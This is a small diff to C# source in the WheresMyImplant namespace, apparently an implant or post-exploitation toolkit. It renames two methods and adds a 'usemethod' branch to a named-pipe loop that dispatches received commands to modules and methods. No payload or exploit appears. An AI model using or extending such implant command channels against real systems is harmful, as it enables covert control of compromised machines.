@@ -67,7 +67,6 @@ namespace WheresMyImplant
                     Console.WriteLine("Pipe already closed");
                 }
             }
-
             disposed = true;
         }
 
@@ -86,7 +85,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        internal void waitForConnection()
+        internal void WaitForConnection()
         {
             namedPipeServerStream.WaitForConnection();
             Byte[] buffer = recieveMessage();
@@ -101,7 +100,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        internal void mainLoop()
+        internal void MainLoop()
         {
             String[] splitCharacters = new String[]{"\0"};
             try
@@ -132,6 +131,10 @@ namespace WheresMyImplant
                 else if (module == "usemodule")
                 {
                     activateModule(arrCommand[1], new Object[] { }, new Object[] { });
+                }
+                else if (module == "usemethod")
+                {
+                    activateMethod(arrCommand[0], arrCommand.Skip(1).ToArray());
                 }
                 else
                 {
